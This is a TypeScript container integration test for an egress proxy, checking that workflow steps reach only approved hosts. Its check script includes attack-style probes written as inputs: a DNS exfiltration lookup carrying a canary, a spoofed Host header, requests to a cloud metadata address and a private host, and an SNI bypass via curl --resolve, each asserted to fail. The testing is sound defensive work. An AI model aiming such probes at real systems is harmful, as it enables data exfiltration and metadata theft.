/**
 * The egress proxy against real containers (workflows spec part 2, *The containers* D; part 6, A7 and V1): a step
 * reaches an approved host and nothing else, by connection or by DNS. The proxy's own way out is a test network
 * whose one other member is a fixture: a logging name server, the only one the proxy may ask, and web servers on
 * two ports — so the tests can see what reached the outside, and that a step's lookups of other names never did.
 *
 * Run with `npm run test:container` from site/. Needs Docker and the executor image (EXECUTOR_TEST_IMAGE,
 * `imgtest/executor:dev` by default), and is skipped when either is missing. Containers and networks are named
 * `wf-lane-2c-*` and under HOST_NAMESPACE `wf-lane-2c`, and removed at the end. One test reaches the internet
 * (registry.npmjs.org and github.com); EGRESS_TEST_OFFLINE=1 skips it.
 */
import { spawnSync } from 'node:child_process'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { ADDRESS_BLOCKS } from '@agenthix/core'

process.env.HOST_NAMESPACE ??= 'wf-lane-2c'
process.env.AGENT_NETWORK_RANGE = ADDRESS_BLOCKS.tests
const IMAGE = process.env.EXECUTOR_TEST_IMAGE ?? 'imgtest/executor:dev'
process.env.EXECUTOR_IMAGE = IMAGE
const HAVE_IMAGE = spawnSync('docker', ['image', 'inspect', IMAGE], { encoding: 'utf8' }).status === 0

import type { RunNetwork } from '../../seams'
import { startRunNetwork, sweepEgress } from '../runNetwork'

const UPSTREAM_NET = 'wf-lane-2c-upstream'
const UPSTREAM_SUBNET = '10.211.250.0/28'
const FIXTURE = 'wf-lane-2c-fixture'
const FIXTURE_IP = '10.211.250.10'
const CANARY = 'canary-7f3a9c1e'

// The fixture: answers A for three names and NXDOMAIN for the rest, logs every query and request it gets.
const FIXTURE_PROGRAM = `
const dgram = require('node:dgram'), http = require('node:http')
const map = { 'app.test': [10,211,250,10], 'internal.test': [10,211,250,10], 'meta.test': [169,254,169,254] }
const s = dgram.createSocket('udp4')
s.on('message', (q, r) => {
  let i = 12, l = []; while (q[i]) { l.push(q.toString('latin1', i + 1, i + 1 + q[i])); i += q[i] + 1 }
  const name = l.join('.').toLowerCase(), type = q.readUInt16BE(i + 1), ip = map[name]
  console.log('dns ' + name + ' ' + type)
  const h = Buffer.from(q.subarray(0, i + 5)); h[2] = 0x81; h[3] = ip ? 0x80 : 0x83
  if (!ip || type !== 1) { h.writeUInt16BE(0, 6); return s.send(h, r.port, r.address) }
  h.writeUInt16BE(1, 6); s.send(Buffer.concat([h, Buffer.from([0xc0, 12, 0, 1, 0, 1, 0, 0, 0, 5, 0, 4, ...ip])]), r.port, r.address)
})
s.bind(53)
for (const port of [8080, 8081]) http.createServer((q, r) => { console.log('http ' + port + ' ' + q.headers.host); r.end('reached ' + port + ' ' + q.headers.host + '\\n') }).listen(port)
`

function sh(cmd: string, args: string[]): { status: number | null; stdout: string; stderr: string } {
  const r = spawnSync(cmd, args, { encoding: 'utf8', timeout: 120_000 })
  return { status: r.status, stdout: r.stdout ?? '', stderr: r.stderr ?? '' }
}

function step(network: RunNetwork, script: string, extra: string[] = []): string {
  const r = sh('docker', [
    'run', '--rm', '--name', 'wf-lane-2c-step', '--memory', '512m', '--cpus', '1',
    '--user', '1001:1001', '--cap-drop', 'ALL', '--security-opt', 'no-new-privileges', ...extra,
    ...network.dockerArgs, IMAGE, 'bash', '-c', script,
  ])
  return r.stdout + r.stderr
}

const fixtureLog = () => sh('docker', ['logs', FIXTURE]).stdout
const proxyName = (runId: string) => `${process.env.HOST_NAMESPACE}-workflow-${runId}-proxy`
const leftovers = () => sh('docker', ['ps', '-a', '--filter', `label=${process.env.HOST_NAMESPACE}.workflow-proxy`, '-q']).stdout.trim()
  + sh('docker', ['network', 'ls', '--filter', `label=${process.env.HOST_NAMESPACE}.network=workflow`, '-q']).stdout.trim()

// What each check prints: its name and how curl or nslookup ended.
const CHECKS = `
try() { local name=$1; shift; out=$("$@" 2>&1); echo "$name exit=$? $(echo "$out" | tr '\\n' ' ' | head -c 300)"; }
try approved curl -sS --max-time 10 http://app.test:8080/
try other-host-header curl -sS --max-time 10 -H 'Host: other.test' http://app.test:8080/
try unapproved-name curl -sS --max-time 10 http://other.test:8080/
try exfil-lookup nslookup leak-${CANARY}.exfil.test
try private-after-resolving curl -sS --max-time 10 http://internal.test:8081/
try metadata-after-resolving curl -sS --max-time 10 http://meta.test:80/
try direct-address curl -sS --connect-timeout 3 --max-time 5 http://${FIXTURE_IP}:8080/
try routes ip route
`

describe.skipIf(!HAVE_IMAGE)('the egress proxy, in containers @SC-1349', () => {
  beforeAll(async () => {
    await sweepEgress()
    sh('docker', ['rm', '-f', FIXTURE, 'wf-lane-2c-step', 'wf-lane-2c-agent'])
    sh('docker', ['network', 'rm', UPSTREAM_NET])
    expect(sh('docker', ['network', 'create', '--subnet', UPSTREAM_SUBNET, '--ipv6=false', UPSTREAM_NET]).status).toBe(0)
    const run = sh('docker', ['run', '-d', '--name', FIXTURE, '--memory', '512m', '--cpus', '1', '--network', UPSTREAM_NET,
      '--ip', FIXTURE_IP, IMAGE, 'node', '-e', FIXTURE_PROGRAM])
    expect(run.status, run.stderr).toBe(0)
  })

  afterAll(async () => {
    sh('docker', ['rm', '-f', FIXTURE, 'wf-lane-2c-step', 'wf-lane-2c-agent'])
    await sweepEgress()
    sh('docker', ['network', 'rm', UPSTREAM_NET])
    expect(leftovers()).toBe('')
  })

  it('lets a step reach the approved host only, and answers every other name itself, never upstream (A7, V1)', async () => {
    const network = await startRunNetwork('c1', [
      { host: 'app.test', port: 8080 }, { host: FIXTURE_IP, port: 8080 },
      { host: 'internal.test', port: 8081 }, { host: 'meta.test', port: 80 },
    ], { egressNetwork: UPSTREAM_NET, upstreamDns: [FIXTURE_IP] })
    try {
      const out = step(network, CHECKS)
      const line = (name: string) => out.split('\n').find(l => l.startsWith(`${name} `)) ?? `${name} missing: ${out}`
      expect(line('approved')).toMatch(/^approved exit=0 reached 8080 app\.test:8080/)
      expect(line('other-host-header')).toMatch(/exit=(52|56)/)
      expect(line('unapproved-name')).toMatch(/exit=6/)
      expect(line('exfil-lookup')).toMatch(/NXDOMAIN/)
      expect(line('private-after-resolving')).toMatch(/exit=(52|56)/)
      expect(line('metadata-after-resolving')).toMatch(/exit=(52|56)/)
      expect(line('direct-address')).toMatch(/exit=(7|28)/)
      expect(line('routes')).not.toMatch(/default/)

      const log = fixtureLog()
      expect(log).toMatch(/^dns app\.test 1$/m)
      expect(log).toMatch(/^http 8080 app\.test:8080$/m)
      expect(log).not.toContain('exfil')
      expect(log).not.toContain(CANARY)
      expect(log).not.toContain('other.test')
      expect(log).not.toMatch(/^http 8081/m)
    } finally {
      await network.release()
    }
    expect(sh('docker', ['container', 'inspect', proxyName('c1')]).status).not.toBe(0)
  })

  it('is out of reach of a container on any other network, an agent\'s for one', async () => {
    const network = await startRunNetwork('c2', [{ host: 'app.test', port: 8080 }], { egressNetwork: UPSTREAM_NET, upstreamDns: [FIXTURE_IP] })
    try {
      const internalIp = network.dockerArgs[network.dockerArgs.indexOf('--dns') + 1]!
      const egressIp = sh('docker', ['inspect', '--format', `{{(index .NetworkSettings.Networks "${UPSTREAM_NET}").IPAddress}}`, proxyName('c2')]).stdout.trim()
      expect(egressIp).toMatch(/^10\.211\.250\./)
      const probe = (net: string) => sh('docker', ['run', '--rm', '--name', 'wf-lane-2c-agent', '--memory', '512m', '--cpus', '1', '--network', net, IMAGE,
        'bash', '-c', `curl -sS --connect-timeout 3 --max-time 5 http://${internalIp}:8080/; echo "internal=$?"; `
          + `curl -sS --connect-timeout 3 --max-time 5 http://${egressIp}:8080/; echo "egress=$?"; `
          + `nslookup -timeout=2 app.test ${internalIp} >/dev/null 2>&1; echo "dns=$?"`])
      for (const net of ['bridge', UPSTREAM_NET]) {
        const out = probe(net).stdout
        expect(out, net).not.toMatch(/internal=0|egress=0|dns=0/)
        expect(out, net).not.toContain('reached')
      }
    } finally {
      await network.release()
    }
  })

  it('gives a step without hosts no network at all', async () => {
    const network = await startRunNetwork('c3', [])
    expect(network.dockerArgs).toEqual(['--network', 'none'])
    const out = step(network, `ip route; echo "routes-end"; curl -sS --max-time 5 http://${FIXTURE_IP}:8080/; echo "curl=$?"; nslookup app.test; echo "dns=$?"`)
    expect(out).toMatch(/^routes-end$/m)
    expect(out.split('routes-end')[0]!.trim()).toBe('')
    expect(out).not.toMatch(/curl=0|dns=0/)
  })

  it.skipIf(process.env.EGRESS_TEST_OFFLINE === '1')('reaches real approved hosts over TLS, two on one port told apart by server name', async () => {
    const network = await startRunNetwork('c4', [{ host: 'registry.npmjs.org', port: 443 }, { host: 'github.com', port: 443 }])
    try {
      const out = step(network, [
        'echo "npm=$(curl -sS -o /dev/null -w "%{http_code}" --max-time 20 https://registry.npmjs.org/)"',
        'echo "github=$(curl -sS -o /dev/null -w "%{http_code}" --max-time 20 https://github.com/)"',
        'curl -sS --max-time 10 https://api.github.com/ >/dev/null 2>&1; echo "api=$?"',
        'curl -sS --max-time 10 --resolve api.github.com:443:$(getent hosts github.com | cut -d" " -f1) https://api.github.com/ >/dev/null 2>&1; echo "sni=$?"',
      ].join('\n'))
      expect(out).toMatch(/^npm=200$/m)
      expect(out).toMatch(/^github=(200|301|302)$/m)
      expect(out).toMatch(/^api=6$/m)
      expect(out).not.toMatch(/^sni=0$/m)
    } finally {
      await network.release()
    }
  })

  it('removes the proxy and networks of a run a crash left behind', async () => {
    await startRunNetwork('c5', [{ host: 'app.test', port: 8080 }], { egressNetwork: UPSTREAM_NET })
    expect(leftovers()).not.toBe('')
    expect(await sweepEgress()).toBe(1)
    expect(leftovers()).toBe('')
  })
})
